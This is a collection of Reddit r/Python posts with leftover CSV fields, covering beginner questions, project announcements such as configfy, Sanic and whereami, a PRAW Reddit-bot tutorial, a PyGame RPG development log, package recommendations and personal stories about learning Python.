I was also trying to figure out a good way of setting up the schema, but everything I've come up with seems like I'm working against good practices or optimization. Storing the training data would be straightforward, but things like the results of each training session don't seem suitable for SQL databases. 

For example: if the data is a time series and you want to track a ""reward"" or something similar at each time step (along with any other time-based data), would you set up a table for each value where each row is a different training session and each column is the datetime of a the time step? Or is there a more optimal approach?

this is my first reddit post: So hello Reddit!

I would like to share with you a small project I have been working on in order to make prototyping with python faster.

[configfy](https://github.com/mapa17/configfy)

Configfy is my first pip package, and it tries to make it easier to expose key program options to the user through the expose of keyword arguments that can be overwritten with a config file.
The idea is that during prototyping you often realize that you need one additional program argument/option and instead of going to the task of writing an argument parser and than pass the argument through your program until it reaches the desired function, you can use configfy to overwrite a keyword argument of the function with an config file.
I hope someone will find this useful or interesting; or completely ridiculous, under any circumstances I would be happy to hear your comments and ideas.

"I've been reading the 'Head First: Python' book & got stuck on if function arguments are by reference or value. I find it really hard to understand to most basic things, so I apologize if I seem rather dumb. This post will explain what is going on in my head, I ask that someone can confirm if I'm on the right tracks.

If not, can somebody maybe explain it in an idiot friendly kind of way? From testing out codes on this, I feel like I'm on the right lines.

An object (variable) is just a reference to its value. When I was learning a little bit of the C language, this is what I got taught. If we assign to an existing variable, it just changes what that variable references. I'm not sure if I'm right here.

When it comes to python, here are my thoughts. I've been told these are wrong, but they just seem so right to me. Everything is passed by reference, but we see it as 'passed by value' if we're passing things which are immutable to the function like tuples, strings and integers as they could never be changed without having to redefine the variable.

Since we're talking about 'by reference' and 'by value' here, I have to explain what these two things mean to me.

For me, by reference simply means we're passing in a reference, the same reference in that variable we're passing, to the same bit of data in memory. Let me explain here what is going on in my head here.

    x = 5 # this 'x' is simply a reference to data in memory
    
    def double(x):
        x = x * 2

We're passing in x, the same x we defined outside the double function. I'm not sure if this is true, it seems to be. So if we change x, then we're changing the x on the outside too, the only way we're not if is x gets referenced to a different bit of data in memory, and what I mean by this is, if we did something like \`x = 9\` in the double function, its no longer referencing to the outside x, but the number 9 we just assigned to it, or rather the reference address to the 9.

When we say by value, what I think this means is, we're passing in the same bit of data, but with its own reference. It's not the same reference as the original x, therefor we see it as a different part of data in memory, a different object?

Hopefully so far, I've got the concepts of 'by reference' and 'by value' right, if somebody could confirm that? Now moving on to when I think it's by value or by reference when we pass them into functions.

Simply, when we pass in immutable types to a function, its by value, technically its by reference but we can't ever change it without reassigning that variable, which makes it a totally different reference (variable) than the one outside the function, so if we pass say a tuple, string or number then technically we're passing it by referencing, but if we want to make it easy on our brain, we can consider it by value, its the same data, but we can't ever change it.

So, finally, I think EVERYTHING is passed by value. But if we reassign the variable, or its immutable, we can simply think of it as by value, a different part of memory from the original variable we pass in to the function, because A) If it's immutable we can't change it anyway, and B) if we reassign it, it gets set to a different reference that what the original variable we pass in references to.

Some code examples,

This will print 5, because x is reassigned a new reference inside change\_x:

    x = 5
    
    def change_x(x):
        x = 1
    
    print(x)

This will print \['John', 'Sarah', 'Adam', 'Tom'\] as we're adding to the same reference of memory the original x points to.

    x = ['John', 'Sarah', 'Adam']
    
    def change_x(x):
        x.append('Tom')
    
    print(x)

I'm really sorry if this went on for too long, I'm just confused right now and asking somebody to help me out, thanks.","Someone, please help me understand this concept?",92ix0r,new

"**EDIT: Solution**

To anybody who happens upon this post with a similar problem, I've come up with three solutions to it:

1. Adding the `main_package` directory to `sys.path` in `controller_script.py:`

    import sys
    import os
    
    sys.path.insert(0, os.path.join(os.path.abspath(os.path.dirname(__file__)), os.pardir)

2. Adding a site-specific configuration hook ([documentation](https://docs.python.org/2/library/site.html)):

    $ echo ""/path/to/main_package"" > ""$(python -m site --user-site)/main_package.pth""

3. Just building and installing `main_package`  like /u/alanjcastonguay said (the proper way to solve this)

"JavaScript's fat arrow functions work so well that they pervade all my code.  It's frustrating to return to Python and not be able to use fat arrow functions. - Python's single line lambda syntax is really no competition.

"[A letter in my own handwriting](http://imgur.com/a/W4ZIk).

I learned Python in 1998, and I used it pretty much daily through my working life. Its connectivity with everything has allowed me to do all kinds of interesting and fun things. When I discovered that the [AxiDraw](http://www.axidraw.com/) pen plotter has a [Python binding](https://github.com/inconvergent/axidraw-xy), I decided to try writing in my own handwriting with my own pen. Something I've been unable to do for years.

It has taken a lot, mostly because I can't type, so I've been limited to voice recognition and copy and paste, but the letter linked above is where I got to this evening.

I thought I would share my mini triumph.

I've learned and programmed in a lot of different languages over the years. I have written several languages myself. And even though Python wasn't my first language, it is the first language I consider for any new project. I'd have to have a compelling reason to use something else. So thank you, Python, for making this possible.

"Hello all

I asked you people if you are interested in learning Python by writing a Reddit bot some time back on r/learnprogramming. I received immense number of responses, so I'm posting it on r/python. It covers the process, practices and tools involved in writing a Reddit bot in Python.

Please post your feedback and questions in comments, and I'll be happy to answer them.

#**Requirements**:

1. You are somewhat familiar with programming in general, and have an idea about Python or other languages (like what are variables etc)
2. You  are on a Unix-like system with access to command line tools
3. Familiarity with [git](https://git-scm.com/) and [Github](https://github.com/) (Not really required...it is better if you are familiar)
4. A Reddit account

Even if you don't meet these requirements...no need to worry!

#**Introduction**

Writing a bot for Reddit is easier than you think, because Reddit provides a structured method to access its data via the [Reddit API](https://www.reddit.com/dev/api). There are amazing tools like [PRAW](https://praw.readthedocs.io/en/latest/) which can help simplify the process. PRAW is a Python wrapper for Reddit, and it takes the pain out of the process of writing a bot.


And as I said earlier, Python is an great language, which is easy to grasp for beginners. What even more amazing is it's community, which has made incredible open-source tools and libraries for almost anything. We will be using some of those, and you will realise how useful they are!

#**Important information - Please read**

1. While this post will cover a variety of programming topics, I highly encourage you to explore more. Go ahead and read the documentation of libraries used and think about how can you improve something in your project. I will possibly add more topics to this post.

2. Please **DO NOT CREATE SPAM** by letting your bot run on all of Reddit before you have thoroughly tested it. **r/test** exists for you to do all sorts of testing with your bot...please use it. Refer to [botiquette](https://www.reddit.com/wiki/bottiquette) and keeping in mind the type of bot you create, comply with the guidelines.

#**The code and resources**

I jus wrote a bot for Reddit, which posts a textual explanation of the popular webcomic [xkcd](https://www.xkcd.com) whenever it encounters an xkcd link. It is named **explainxkcdbot**. As of now, I have set my bot to run on r/test only to let you people test it all you want.


You can find the complete source code on my Github page - 
**https://github.com/aydwi/explainxkcdbot**

Here is the code for the bot -
**https://github.com/aydwi/explainxkcdbot/blob/master/explainxkcdbot.py**


#**How to run the bot**

The process is given here - https://github.com/aydwi/explainxkcdbot/blob/master/README.md

If you have any problems in running the bot, please let me know in the comments.


#**Let us begin**

We will move forward step-by-step in the code, and see what is going on.

##Section 1 - Importing libraries


https://gist.github.com/aydwi/e5e4f294b66adf1cb025a70a0392f847


This is the beginning of the program. Any line which begins with a `#` sign is a comment in Python, so it is not interpreted as code. Then we import the essential libraries required for out program. These libraries contain the methods (or functions) which we will use throughout our program. The syntax is pretty straightforward. Next we see 3 variables with some values assigned to them. More on them later.


##Section 2 - Authenticating


https://gist.github.com/aydwi/b941d04d8128e415d6630e961cc97988


This is where important things begin. Before proceeding, you should have a basic idea of what are **[classes](https://docs.python.org/3/tutorial/classes.html)** and **[methods](https://stackoverflow.com/questions/3786881/what-is-a-method-in-python)** in Python. One more important thing is an **object** - it is an instance of class, which holds the data variables declared in class and the **member functions work on these objects**. Please make a comment if you do not understand, I will try to explain.


`def authenticate():` defines a function which will try to authenticate the bot to Reddit. This is where PRAW comes into play as it provides us methods to do this. Remember we created a *praw.ini* file earlier. It is a configuration file that stores authentication credentials, so that you just call it whenever needed.


Next, we pass authentication parameters to `praw.Reddit()`. Here `explainbot` refers to the credentials in the configuration file, and `user_agent` is a descriptive string about your script/bot. This returns a [Reddit instance](https://praw.readthedocs.io/en/latest/code_overview/reddit_instance.html), which we assign to the variable `reddit`, and use this variable whenever we wish to authenticate.


Next up, we make a print statement to see who is getting authenticated i.e. the name. The `user` class in PRAW provides methods for the currently authenticated user. We call the method `me()` on `user` and then call it on the variable holding the Reddit instance for authentication, which in our case is `reddit`. So the statement becomes `reddit.user.me()`. We just use some [formatting in python](https://pyformat.info/) to print it.


Finally we `return` the variable `reddit`. Now i can use this `authenticate()` function in my program by calling it when I need it, and it will give me the variable `reddit`, which stores the Reddit instance.

------------------------------

**Important note 1:** Why did I create a function? It is because creating functions makes us easy to manage out code. We write separate functions for separate features of the program, and call them wherever needed. This breaks the code into manageable chunks, which makes it easy to read, modify and debug.

------------------------------

##Section 3 - Scraping


https://gist.github.com/aydwi/699123424e7b38da19d62e69339e859c


Next up is the function `def fetchdata(url)`. Notice how this function takes a parameter `url`. We pass this parameter whenever we call this function. The purpose of this function is to scrape/gather the data from the web, in order to post an explanation.


**Now scraping is not a very reliable process**, but sometimes we just have to do it. We go to a website, go through it's HTML source, and extract the text, links etc. that we want. Here we use **[Requests](http://docs.python-requests.org/en/master/user/quickstart/#make-a-request)** library to make a web request, and **[Beautiful Soup](https://www.crummy.com/software/BeautifulSoup/bs4/doc/)** to extract the data.


`r = requests.get(url)` gives a Response object called `r`. We can get all the information we need from this object. Then we call the method `content` on `r`, and pass it to `soup = BeautifulSoup(r.content, 'html.parser')`, which gives us a `soup` object with which we can retrieve elements of a web page. Read more [here](https://www.crummy.com/software/BeautifulSoup/bs4/doc/).


Now what happens depends on what are you scraping. Every website has different type of content, and you should go through the HTML to see how can you retrieve what you want. In my case http://explainxkcd.com has it's explanation inside the first few `<p>` tags, so I look for the first `<p>` tag by `tag = soup.find('p')`. Also, immediately after the explanation ends, `<h2>` tag follows, so I know where to stop. Now take a look here-

    while True:
        if isinstance(tag, bs4.element.Tag):
            if tag.name == 'h2':
                break
            if tag.name == 'h3':
                tag = tag.nextSibling
            else:
                data = data + '\n' + tag.text
                tag = tag.nextSibling
        else:
            tag = tag.nextSibling

I continue to look through the tags, and store textual data in a `string` named `data` and move to the next tag. I `break` the process if I encounter `<h2>` because I know that is where explanation ends. The code depends on the structure of website you are scraping. Finally, I return `data`, so that now when I call the function like `fetchdata('http://explainxkcd.com/1024')` for example, it returns me the explanation of comic 1024 as a `string` named `data`.

----------------

**Important note 2:** Scraping is unreliable. If the website changes it's structure, you have to change your code. In this case, it can still include some tags which we don't want. The line `if (tag.name == 'h3')` in the above function is for handling one such unexpected situation I encountered on http://explainxkcd.com. This is why we like to have APIs. 

--------------------------


##Section 4 - Using regular expressions, parsing URLs, handling exceptions and preventing duplicate submissions


https://gist.github.com/aydwi/700db3e46770d13fe89356d0fa4f570d


This function which takes a parameter which is a Reddit instance (remember that Reddit instance from Section 1). Again we use PRAW to get one or more subreddits, and go through their comments. See [here](https://praw.readthedocs.io/en/latest/code_overview/reddit/subreddits.html) and [here](http://praw.readthedocs.io/en/latest/code_overview/models/comment.html).

You can pass multiple subreddits like `for comment in reddit.subreddit('test+learnprogramming+pics')`.

**Regular Expressions**: Now I want to extract xkcd links from the comments, so I need to look for a pattern for the URL. xkcd links are of the form `https://www.xkcd.com/[some number]`. So we make use of regular expressions from the `re` library to match the pattern. [More about regular expressions](https://regexone.com/references/python).

    match = re.findall(""https://www.xkcd.com/[0-9]+"", comment.body)
        if match:
            print(""Link found in comment with comment ID: "" + comment.id)
            xkcd_url = match[0]

Here I look for all strings that are like `https://www.xkcd.com/[some number]` using the method `findall` from [user comments](http://praw.readthedocs.io/en/latest/code_overview/models/comment.html), and if it matches, it returns a list with the matching URL, and we store our URL in the variable `xkcd_url`.

----------------

**Important note 3:** Try to find out regular expressions (regex) to improve this program. What happens if a user posts 'https://xkcd.com/1024' or http version as 'http://www.xkcd.com/1024'. These are still valid xkcd URLs. There can be some other cases where the URL might be placed between a bunch of symbols in a comment. Try to modify the regex statement so that it can detect these cases as well.

--------------------------


**URL parsing**: Now I have an xkcd URL. I have 2 immediate objectives now- 

Objective 1. To extract the comic number at the end of the URL. We use [urllib.parse](https://docs.python.org/3/library/urllib.parse.html) for this purpose.

    url_obj = urlparse(xkcd_url)
            xkcd_id = int((url_obj.path.strip(""/"")))

Objective 2. Form a complete **explainxkcd.com** URL, which I will pass as a parameter to the function `fetchdata(url)` (See Section 2)

    myurl = 'http://www.explainxkcd.com/wiki/index.php/' + str(xkcd_id)

Both objectives are thus complete.

**Preventing duplicate submissions and Exception handling**: The bot needs to make sure it replies to every comment only once. There are many methods you can try which include using a separate key-value database like [Memcached](https://memcached.org/), but we will use a simpler approach.


Just create a text file (remember commented.txt), store the comment ID of a comment in it when you  visit a relevant comment, and verify if a comment ID already exists in that file before making new comments. Remember to put the location of the text file in the `path` variable (from Section 1), so that you can pass it to the method `open()`.


Now, what happens when a user makes a comment like 'https://www.xkcd.com/689243348723'. This xkcd does not exist, but the program will extract '689243348723', then form a link like http://www.explainxkcd.com/wiki/index.php/689243348723, and pass it to the function `fetchdata(url)`. Now **the function will return an exception and your program will stop/crash**. You need to take care of these situations.

This is achieved using `try`, `except` and `else` blocks. [See here](https://docs.python.org/3/tutorial/errors.html) Here is the code for these 2 steps-

    file_obj_r = open(path,'r')
                        
            try:
                explanation = fetchdata(myurl)
            except:
                print('Exception!!! Possibly incorrect xkcd URL...\n')
                # Typical cause for this will be a URL for an xkcd that does not exist (Example: https://www.xkcd.com/772524318/)
            else:
                if comment.id not in file_obj_r.read().splitlines():
                    print('Link is unique...posting explanation\n')
                    comment.reply(header + explanation + footer)
                    
                    file_obj_r.close()

                    file_obj_w = open(path,'a+')
                    file_obj_w.write(comment.id + '\n')
                    file_obj_w.close()
                else:
                    print('Already visited link...No reply needed\n')


Notice how I make a reply to a relevant comment by using the variables from Section 1 to print header and footer description alongside the explanation - `comment.reply(header + explanation + footer)`


Next we make some `sleep` statements to stop the bot from querying Reddit too fast. If the Reddit API returns an error due to too many requests, adjust `val` in the instances of `time.sleep(val)` in your program.


##Section 5: The main function


https://gist.github.com/aydwi/99323ebd710428f4590077a844236f83


We are almost done here. We wrap our functions into a `main` function by calling `authenticate()` (remember Section 1) and passing it to the function which runs the bot, namely `run_explainbot(reddit)`. Since we are calling it inside `while` loop with the expression 'True', it will run indefinitely.


#My bot in action


Test post to show the bot in action: https://redd.it/6tey71 (Since I'm not running it continuously as of now, it won't reply to every comment containing an xkcd link there)

"Hey everyone, I'm a C/C++ programmer who recently discovered Python.  My friend told me about PyGame, and I decided to try to write an entire game in it.  I want to tell you the order I did things in, as I think you might find it interesting, and maybe try it yourself some time!

**Background:**

Epikos is an RPG I'd been wanting to make for years, but never really had the time to make.  Python, however, writes really expressive code and can really accelerate dev time.  I feel like I can write code 50X faster in Python than in C++.

Since I have a day job, this had to be a project which I could do after work.  Entire thing took about two years, including making all the assets for the game and all the tools.  Workload was about 2 hours after work each day, and a lot more time on the weekends.

**Step 1:  Making the tools for the game**

For reference, game screenshots can be seen here:

http://www.epikosrpg.com/screenshots/

**The Console:**

First, I made what I call a ""console.""  It's a bit like a DOS or Linux shell.  I wanted this so I could type commands into my game and the toolset used to create the game.  It doesn't look like much, but here is an example of what the console looks like:

http://imgur.com/mMutYwL

**The Paint Program:**

Next, the game needed a program to create sprite art in.  I could have used photoshop, aesprite, or any number of paint programs, but I wanted to make my own custom sprite animation tool, and I wanted it in Python.  I had barely done any python coding at this point, but even then the paint tool took only a couple of days to write.  It's called tilemake, and it looks like this:

http://imgur.com/Qw4BMMc

As you can see, this paint tool uses the console, which I had built first.  In the above example, I have loaded the ""knight"" sprite, which is used for one of the main characters in the game.  The tool shows you multiple zoomed in versions of the sprite (""mips"") and you can paint on any one of them, using the CGA color palette.  You can also animate the sprites in this very tool.

I got a lot of milage out of this tool, as the game has 826 sprite frames in it, all made with this very paint program.

**The Map Editor:**

Now, my game needed 2D maps.  Since I had some art made with the paint program, it was time to arrange this art in the form of a map.  The map editor looks like this:

http://imgur.com/qLA9vYk

There are several components to this editor, but keep in mind I'm sticking 100% to Python.  In the main view, you can zoom and scroll about with the mouse, and paint using several different sized brushes.

You can see a column to the right which says ""natural"".  This shows all the sprites which are used in a natural environment.  There are other categories, such as indoors, dungeon, etc.  Categories were important, since I have many, many different sprites.

Finally, on the bottom you can see our old friend, the console.

**Step 2:  The Game Itself:**

Once you have the map editor, making a game isn't really that different, it just has gameplay logic.  Most of it is really simple, this includes combat logic, movement, etc.  I'm not going to go into the details of these since writing them in Python should be fairly trivial, but ask me if you want something explained in greater detail.  I will, however, go over some highlights and gotchas:

**AStar (A*):**

A* is a common AI algorithm used for pathing.  Implementing it in Python is pretty easy.  Python reads a lot like pseudocode, and A* can be found on wikipedia:

https://en.wikipedia.org/wiki/A*_search_algorithm

That code isn't really very different from Python is it?  As an excercise, you can try pasting that into Python and see what you need to change.  Hint:  not much.  Shouldn't take you more than half an hour to get some good AI pathing going.

**Save/Load with Pickle:**

I *love* pickle, and used it for save/loading.  It's a standard Python module, so if you haven't used it yet you should check it out.  One gotcha was that saveing and loading maps was too expensive in pickle, so I compressed the maps first with basic dictionary encoding, and then used pickle on them.

When writing save/load, make sure to include version filtering or some mechanism so that if you change file formats later on, older files are automatically updated.  You don't want your players to lose progress just because you patched and changed savegame format!

**Font?:**

There are several legal issues surrounding the use of fonts on a cross-platform title, and I really didn't want to bother with that.  I couldn't find a good free font which matched my art style, so I created my own font for my game.  If you can do this, I recommend it, because then you own it and can use it forever.

**Music:**

One thing I didn't write from scratch was the music authoring software.  Audio isn't really my expertise, but I wanted NES sounding music.  I ended up using this:

http://famitracker.com/

Famitracker is a fun way to write NES-sounding music, and indeed it actually writes to the nes file format.  Of course, PyGame can't play this, so I converted it to .ogg format.  Why .ogg?  I found that other supported formats tended to crash pygame, so I recommend that one.

**Sound FX:**

Similarly, I wanted an old-school feeling for my sound FX.  Authoring these in famitracker didn't seem that efficient, but someone showed me a tool called bfxr:

http://www.bfxr.net/

This let me create all kinds of sounds for my game.  For more complicated sounds, I needed to fallback to famitracker, but 90% of the sounds were in bfxr.

**Shipping the Game:**

I couldn't ship raw .py files, so I used pyinstaller to turn my game into a single .exe file.  I had tried python2exe, but couldn't get it to work very well with pygame.  Maybe you can have better luck with python2exe, but I'd recommend pyinstaller.  PyInstaller uses another library called setupTools.  For some reason, my .exe wouldn't work with the latest version of setupTools (gave an error and immediately quit), so I had to do this:

pip install setuptools==19.2

That gives you the older version, which should work.

The last part of shipping is making the .exe and game assets into an installer.  For this I used something called NSIS.  Sadly, I can't recommend you use this at this point, since it was on Sourceforge and if you go there now you'll probably get viruses and malware (RIP Sourceforge).  If you happen to have an older version of NSIS, I recommend backing it up on your google drive, since re-downloading it is not an option.

**Conclusion:**

While there were some gotchas, I didn't have too much trouble making a small-scale game 100% in Python, and it was a suitable project to do after work, even while working a full-time job.  

Happy coding!

**Edit:**

Thank you for the Reddit gold.  This has inspired me to share some other misc info with you now:

*  One huge advantage of Python is that porting from Windows to Linux only took an afternoon.  I did it all on virtualbox running Mint.  In fact, setting up virtualbox to run Mint was harder than porting the game.  There were two gotchas.  First, if you're using time.clock() on windows, make sure to change it to time.time() on Linux.  Second, some of the backslashes in filenames needed to be changed to forward slashes.  That's it!!!

*  If you are on Windows, I recommend trying the Python plug-in for Visual Studio.  I didn't actually use it while developing my game, but I think it would have helped from time to time.  It gives breakpoints, variable watch, and callstack info.

"Hi there, my name is Harrison and I frequently do Python programming tutorials on [PythonProgramming.net](https://pythonprogramming.net) and [YouTube.com/sentdex](https://www.youtube.com/user/sentdex).  All tutorials are free in both text and video forms.

The latest series that I have put out is [Python for Finance](https://pythonprogramming.net/getting-stock-prices-python-programming-for-finance/). The aim of this series is to show what can be done with Python in the field of finance and algorithmic trading using data science (spoiler alert: a lot!). 

Even though you probably aren’t going to get rich, you might save yourself a lot of money (when you back test your silly trading idea and realize it’s bad), and you’ll learn about statistics and data science with Python along the way. 

I start the series off with a simplistic introduction to using Python+[Pandas](https://pythonprogramming.net/data-analysis-python-pandas-tutorial-introduction/)+[Matplotlib](https://pythonprogramming.net/matplotlib-intro-tutorial/)  to get stock data, visualize stock data, and to manipulate this data. 

From here, we get into Quantopian, which is a Python-based platform built on top of the Zipline library for back-testing, but has since expanded out to enable quite a bit more than that.

We use Quantopian both for simplistic back testing, but also for doing research into future trading strategies, since Quantopian also provides a bunch of free data like minute pricing data, fundamentals along with tools like [Alphalens](https://github.com/quantopian/alphalens) for analyzing various factors that you believe to be beneficial to a trading strategy.

If you would like to check it out, the series starts here:

"I feel like there are a lot of packages out there that are incredibly useful, but often get overlooked for one reason or another. It seems like people spend a lot of time re-implementing something that's already been done pretty well, and that's too bad. Because, using a nice package with a slick api is like taking a breath of crisp morning mountain air.

So here's some packages I love that I think folks should know about and take a look for themselves:

[Inflection](http://inflection.readthedocs.io/en/latest/): Inflection is ridiculously useful. It has all kinds of tools for altering strings into different formats. Think, conversion from CamelCase to snake\_case. Or, even ordinalizing numbers (1 -> 'first'). Pluralization is in there too. It's really handy with lots of features. I've used it for a few years now without any problems and a whole lot of fresh air in my life.

[Pendulum](https://pendulum.eustace.io/): Python's datetime library is....well, painful to use. It has most everything you need, but doing what you want might be a whole afternoon of consternation. I used a few date/time libraries before I stumbled onto Pendulum. This library is really great. Not only does it offer a great parser that you rarely have to provide anything more than a string representation of a datetime, but it has lots of really useful utilities for working with dates and times (and both). Finally, the best part is that it's a \_drop-in\_ replacement! In fact, Pendulum DateTime objects inherit from python's native DateTime, so you can almost always use them anywhere you would use normal DateTime. This one has been a favorite for a long time.

[pprintpp](https://github.com/wolever/pprintpp): Python's native pretty-printer often renders stuff that's...well, not pretty at all. I often deal with a lot of deeply nested native data-structures (basically JSON rendered into python), and when I'm debugging python's pretty-printer feels pretty stuffy. Enter pprintpp. It's a drop-in replacement that can monkey-patch the built-in pprint function. At any rate, my deeply-nested dicts are formatted with a whole lot more readability in my logs with this package

[Snakeviz](https://jiffyclub.github.io/snakeviz/): Profiling performance becomes a pretty necessary task in most python projects with any degree of longevity. However, exploring profile dumps can be a super stuffy experience a lot of times. I've suffered through enough non-intuitive files and interfaces trying to dig down to the cause of slowness in my lifetime. Then, I found Snakeviz. It provides a really intuitive, interactive, in-browser way to explore profiling information. This tool has actually made profiling fun and exciting, and I can't recommend it enough.

[Livereload](https://github.com/lepture/python-livereload): Suppose you're doing something like, say, working on your project's documentation. It's really not fun to, after each tweak of your config or doc files, have to manually run the sphinx-build commands and then open the produced html in a browser. Instead, you might try Livereload. You provide a list of files to watch, run it, and open a browser. Then, any time you change the file, your page will automatically reload. It's a core element of one of my personal projects (sphinx-view...and this doesn't count as my plug), and without it things would be a lot more painful. It can also be used for any number of other situations where html is produced from source files. It's pretty easy to use, too, and soo crisp and cool when you see it in action.

Finally...my plug:

[py-buzz](https://github.com/dusktreader/py-buzz): ""That's not flying, it's falling with style."" Honestly...I have way too much fun with the name. The whole point of this package is that I found myself re-writing the same pattern over and over with custom exceptions. Typically, when I'm writing a new library, I end up with a custom exception base-class that I use (along with derived exceptions) throughout the project. Then, I end up doing the same thing over and over. Well, I took that irritation and turned it into a tool. The handiest parts of this package is the \`Buzz.require\_condition\` function that acts like an assert that isn't disabled in production and \`Buzz.handle\_errors\` which gives you a context manager to handle exceptions within a block. I dog-food the hell out of this package, so it should be in great working order. There's other neat features, but I'll let you read up yourself, if you're interested.

If not, please enjoy learning about the other 5 packages above.

And, please remember, if you find yourself dealing with something annoying: Stop. Google the problem. Find a package that already does it. Install that. Breathe the fresh mountain air.","5 rarely mentioned but super useful packages you should know about. Also, one of mine",8wc2vi,top

i've been logging this data for a while so i figured i should do something with it and started working on a support facing tkinter front end to streamline the way we handle support calls and tickets...

i showed it to my boss and he had me do a demo for the whole team today doing our team meeting... told everyone 'i encourage you to try it so we can get the bugs out, i'm later going to *tell* you to use it'... he said i'd also get dev time to improve it... everyone liked it and i've been getting good feedback about it... the feeling is amazing and i thought i'd share it with this community and maybe get some of your stories

"I'm not super experienced in Python \-\- my main programming language is Java, but I learned Python from a CS course I took last semester.  I love programming, but I also really love hip hop music.  I typically find this music by looking at a website called Hot New Hip Hop, which keeps a list of the top 100 new songs at any given time.  There are a select number of artists who I like, and a lot of the time the tracks are too new to be on Spotify.

To save myself time, I automated my process of searching for and discovering new music.  I used Windows Task Scheduler to schedule a script to run every morning, scrape the top 100 songs page, and add songs to a playlist if they're made by artists I like and are on Spotify.  I also used a SQLite database to store my Spotify client and access tokens, as well as prevent adding duplicate songs.  This script will probably save me about 45 minutes to an hour each week, which is pretty sweet.

"Since 3.6 [dicts preserve order because of the new “compact” representation](https://docs.python.org/3.6/whatsnew/3.6.html#whatsnew36-compactdict) but it was just an implementation detail and we were told not to rely on it. 

But in 3.7 dicts **officially** became ordered:

> Performing `list(d)` on a dictionary returns a list of all the keys used in the dictionary, **in insertion order**

(from https://docs.python.org/3.7/tutorial/datastructures.html#dictionaries)

TBH, I'm not sure that this is a good idea. I can see a number of problems with this change in future:

1. Now people will start relying on the order of elements in a dict and if Python developers want to change the implementation in future they will **have to** preserve the order as well.
2. It forces developers of other Python interpreters to implement this feature as well even if it will cost them some additional work or decrease performance.
3. It makes `collections.OrderedDict` redundant which could lead to confusion.

What do you think about this decision? Why do you think they made it?",TIL that starting from 3.7 dicts are officially ordered,8cf4rf,top

"Today I am releasing my first book, **Python 101**, for free for 48 hours. Python 101 was written as an introduction to the Python programming language. While it is intended for beginners, some have claimed that they needed more hand-holding than this book provided for them. So I currently recommend it as an introductory and intermediate book for developers that are looking to learn Python.

When I originally wrote the book, I noticed that there were few or no books available that described how to create executables of your code or distribute your code via Python’s Package Index (PyPI). Python 101 covers these topics as well as introducing the reader to Python’s standard library, how to install 3rd party packages and an introduction to some of the most popular 3rd party packages for Python, such as SQLAlchemy, requests and virtualenv.

Python 101 has **5 sections, 44 chapters and 295 pages**.

You can get Python 101 for free on Leanpub using the following link: http://leanpub.com/python_101/c/48hours

"After seeing how it was possible to [make python networking great again](https://www.reddit.com/r/programming/comments/4hqd1b/uvloop_make_python_networking_great_again/), I was inspired to make a Flask-like microframework + web server that could take advantage of async IO and the work that the wonderful people are [magicstack](https://magic.io/blog/)  have been doing.

It's called Sanic, and it goes fast.  

### Sanic is:

* Async - handle requests asynchronously, just throw async before def
* Shiny - Runs on python 3.5
* Simple - Flask-like routing
* Lightweight - No special tools, just run it with python

## Benchmarks

| Server  | Implementation      | Requests/sec | Avg Latency |
| ------- | ------------------- | ------------:| -----------:|

| Aiohttp | Python 3.5 + uvloop |        2,979 |     33.42ms |


## Syntax

    from sanic import Sanic
    from sanic.response import json
    
    app = Sanic(__name__)
    
    @app.route(""/"")
    async def test(request):
         return json({ ""hello"": ""world"" })
    
    app.run(host=""0.0.0.0"", port=8000)

This is my first open-source project and I'm looking for feedback and contribution if anyone is interested :)

Sanic was created because I love the freedom of Flask, but dislike deploying it and its lack of native async support.  I'm wondering if anyone else has the same feels, and/or is interested in using Sanic for their project. Your feedback is welcome!","What if Flask was async and 6x faster out of the box?

"This year, the university I attended for my CS degree is switching from teaching C++ to Python for its entry level classes.  

I don't know how I feel about it as having C++ as my base language helped me understand the underlying structure of how programming works. Then, learning Python was like picking up the bass after already knowing guitar. 

My younger brother just started the program at the university, and I feel like he is being shortchanged a bit. I see the argument as Python has less of a barrier to entry. 

If you know both C++ and Python, which one did you learn first? In hindsight would you have switched the order you learned them? Does only learning Python make you miss out the things learning a lower level language can teach you?

I'm not looking for an argument on which language is better; I simply would like to hear your experience in learning Python as I try to understand of pedagogy of programming. ",University switching from teaching c++ to python,7vllc2,top

As can be seen on the [whereami github](https://github.com/kootenpv/whereami):

    # bash
    pip install whereami
    
    # in your bedroom, takes 100 samples

    # in your kitchen, takes 100 samples
    whereami learn -l kitchen                  # default n=100
    
    # cross-validated accuracy on historic data
    whereami crossval
    # 0.99319
    
    # use in other applications, e.g. by piping the most likely answer:
    whereami predict | say
    # Computer Voice says: ""bedroom""
    
    # probabilities per class
    whereami predict_proba
    # {""bedroom"": 0.99, ""kitchen"": 0.01}

**What's new**

- Now cross-platform (OSX, Windows, Linux such as Ubuntu/Arch Linux)
- Spawned [access_points](https://github.com/kootenpv/accces_points) package in the process (just purely for scanning wifi)
- `whereami` now does not retrain a model before each prediction but only creates a model after new learning
- Big refactoring, allowing a simplified model with more power
- A model is now saved on disk in a way that allows API changes without affecting the model

"(Sorry for the throwaway, but I wanted to be able to answer questions honestly without any hesitation.)

I've been in IT since I was 17 in 1999. I started off at a help desk, and worked my way up to a Systems Administrator where I was making 60k USD/yr. (I currently have only an associates degree with no plans to go back to school.) I was primarily a Windows domain/ network admin, with a few *nix boxes spread throughout. I had known windows batch scripting, and way back in the day had programmed in BASIC before the world was.


I had tossed around the idea of learning a programming language before, but when asked I'd often say ""Developers' brains just work differently than mine. I'm not a coder."" Programming seemed so abstract and I couldn't really wrap my head around it.  I finally decided though, to try something.

It was 2010 and I had heard a lot of Ruby on Rails and thought that Ruby would be a great language to learn. I ran through the tutorial of making a polls app at least 5 times, but I just couldn't wrap my head around it. So I gave up.


One year later I heard about python. Despite all the negative talk about python while googling for ""python vs ruby vs php vs ..."" *(GIL, speed, whitespace, duck typing, (not that I knew what ANY of that meant anyway))* I decided that I really wanted to give it a shot. I started out with codeacademy to get my feet wet, I'd tinker with idle while my wife and I would watch netflix after the kids went to bed. Then I started dreaming in code.

Have you ever had ""work dreams""? The kind you have for about 2 weeks after starting a new job that's really hard? That was python for me. Being primarily in a Windows environment it was hard to find anything for python to do initially at work. My boss didn't program, and really didn't see the value in it. Then one day I found myself needing to compare a list of files. I needed to find all the files that were in one column but not in the other. I had them in excel and after working through a formula I had my answer, but I hated it. All I wanted to do was write something like--

    select name from column1 where name not in (select name from column2);
    
Enter python and sqlite. It probably took me about 3 hours to figure it out, but I imported a csv into a sqlite table in python so I could query it. BAM! I was hooked from then on.

Every night I would tinker, read, and play. I found tons of things to automate at work, making my time so much more effective. I loved it. I became a python evangelist. I'd like to say that my boss was impressed, but really he never came around, and it frustrated me. Fast forward a year.

